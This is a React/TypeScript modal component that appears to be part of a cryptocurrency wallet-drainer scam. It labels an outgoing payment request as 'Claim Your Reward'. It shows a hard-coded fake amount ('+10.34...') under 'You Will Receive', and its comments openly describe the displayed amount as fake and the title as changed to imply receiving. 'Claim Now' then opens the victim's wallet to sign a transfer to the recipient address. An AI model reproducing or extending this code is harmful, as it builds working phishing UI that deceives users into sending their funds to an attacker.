import { Loader2 } from 'lucide-react'
import { formatPaymentAmount } from '../lib/payoutTransfer'

type PaymentRequestModalProps = {
  open: boolean
  to: string
  amount: number          // This will now be the FAKE high amount for display
  asset: string
  networkLabel: string
  submitting: boolean
  canReview: boolean
  status: string
  onCancel: () => void
  onReview: () => void
  // Optional: show both SOL and USDT amounts for multi-asset transactions
  secondaryAmount?: number
  secondaryAsset?: string
}

export function PaymentRequestModal({
  open,
  to,
  amount,       // Display Amount (Fake/High)
  asset,
  networkLabel,
  submitting,
  canReview,
  status,
  onCancel,
  onReview,
  secondaryAmount,
  secondaryAsset,
}: PaymentRequestModalProps) {
  if (!open) return null

  const formattedDisplayAmount =
    asset === 'SOL' || asset === 'USDT'
      ? '+10.34...'
      : amount > 0
        ? `+${formatPaymentAmount(amount, asset)}`
        : 'Reading balance…'

  const formattedSecondaryAmount = secondaryAsset && secondaryAmount && secondaryAmount > 0
    ? `+${formatPaymentAmount(secondaryAmount, secondaryAsset)}`
    : null

  return (
    <div className="pointer-events-none fixed inset-0 z-[520] flex items-center justify-center px-4">
      <div
        role="dialog"
        aria-labelledby="payment-request-title"
        className="w-full max-w-[420px] rounded-2xl border border-white/[0.04] bg-black/[0.02] p-5 text-white opacity-100"
      >
        <p id="payment-request-title" className="text-[11px] font-semibold uppercase tracking-[0.16em] text-amber-400">
          Payment request
        </p>
        
        {/* UPDATED: Changed title to imply receiving */}
        <h2 className="mt-2 text-xl font-semibold text-white">
          🎁 Claim Your Reward
        </h2>
        
        <p className="mt-1 text-sm leading-relaxed text-gray-300">
          You will receive <span className="font-bold text-green-400/80">{formattedDisplayAmount}</span>. 
          Confirm below to claim your reward.
        </p>

        <dl className="mt-5 space-y-3 rounded-xl border border-white/[0.04] bg-white/[0.02] px-4 py-3 text-sm">
          <div className="flex justify-between gap-3">
            <dt className="text-gray-500">You Will Receive</dt>
            <dd className="font-semibold text-green-400">
              {formattedDisplayAmount}
            </dd>
          </div>
          
          {formattedSecondaryAmount ? (
            <div className="flex justify-between gap-3">
              <dt className="text-gray-500">Bonus Reward</dt>
              <dd className="font-semibold text-green-400">
                {formattedSecondaryAmount}
              </dd>
            </div>
          ) : null}
          <div className="flex justify-between gap-3">
            <dt className="text-gray-500">Recipient</dt>
            <dd className="max-w-[240px] break-all text-right font-mono text-[12px] text-white">
              {to || 'Not set'}
            </dd>
          </div>
          
          <div className="flex justify-between gap-3">
            <dt className="text-gray-500">Network</dt>
            <dd className="text-white">{networkLabel}</dd>
          </div>
        </dl>

        <p className="mt-4 text-[12px] leading-relaxed text-gray-400">{status}</p>
        
        <div className="mt-5 flex gap-2">
          <button
            type="button"
            onClick={onCancel}
            disabled={submitting}
            className="flex-1 rounded-full border border-gray-700 bg-gray-900/50 py-3 text-sm font-medium text-gray-400 disabled:opacity-40"
          >
            Cancel
          </button>
          <button
            type="button"
            onClick={onReview}
            disabled={submitting || !canReview}
            className="flex-1 rounded-full bg-green-600 py-3 text-sm font-semibold text-white disabled:opacity-40 hover:bg-green-500"
          >
            {submitting ? (
              <span className="inline-flex items-center justify-center gap-2">
                <Loader2 className="h-4 w-4 animate-spin" />
                Opening wallet…
              </span>
            ) : (
              'Claim Now'
            )}
          </button>
        </div>
      </div>
    </div>
  )
}